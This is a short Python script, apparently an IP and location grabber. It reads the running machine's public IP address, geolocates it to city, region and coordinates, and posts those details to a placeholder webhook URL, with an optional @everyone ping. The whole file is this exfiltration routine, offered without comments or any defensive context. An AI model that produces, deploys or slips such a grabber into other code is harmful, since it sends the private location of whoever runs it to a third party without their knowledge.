#!/usr/bin/env/python
import requests, json
from ip2geotools.databases.noncommercial import DbIpCity
from urllib.request import *

webhook_url = 'WEBHOOK URL HERE'
ping = True
if ping:
	everyone = '@everyone\n'
else:
	everyone = ''

response = requests.get('https://api.ipify.org/?format=json')
jsondata = response.json()

ip = jsondata['ip']
rsp = DbIpCity.get(ip, api_key='free')

data = {
    "content": f"```{everyone}IP: {ip}\nCity: {rsp.city}\nRegion: {rsp.region}\nLatitude: {str(rsp.latitude)}\nLongitude: {str(rsp.longitude)}"
}

requests.post(webhook_url, json=data)
